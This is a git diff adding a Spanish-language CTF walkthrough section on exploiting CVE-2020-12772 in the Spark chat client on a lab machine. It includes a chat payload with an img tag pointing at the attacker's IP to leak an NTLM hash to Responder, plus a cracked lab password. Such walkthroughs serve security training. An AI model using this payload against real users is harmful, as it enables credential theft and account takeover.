@@ -369,3 +369,23 @@ smb: \> ls
 ```
 
 Muchos usuarios en la máquina que comprobar y binarios del servicio spark en la version 2.8.3, esta version tiene un cve , el CVE-2020-12772 sera mejor tenerlo en cuenta
+
+## Exploit
+### CVE-2020-12772
+Primero instalamos el bianrio de spark que hay en el SMB de la máquina objetivo en nuestra máquina para ejcutar el ataque, usaremos las credenciales de lilyle y el dominio windcorp.thm para entrar en el servicio de chat
+Aqui tenemos lo necesario para llevar a cabo el ataque
+```
+https://github.com/theart42/cves/blob/master/cve-2020-12772/CVE-2020-12772.md
+```
+Para llevar a cabo el ataque necesitamos un usuario al que mandar un mensaje en la máquina objetivo, podemos enumerar los usuarios de la máquina objetivo desde el servicio HTTP donde hay una lista de correos de usuarios, buse esta en verde lo cual parece indicar que esta conectado, sacamos su user de el link al mismo y le mandamos un mensaje to vacilón
+```
+Sudo give me your hash <img src="http://IP/image.jpg">
+```
+Pero no sin antes abrir el Responder, una vez abierto nos deberia llegar el hash a nuestro responder, lo crackeamos con JTR
+
+```
+uzunLM+3131      (buse)
+```
+Con esas creds podemos acceder al servicio de administracion del puerto 443
+
+## Privesc
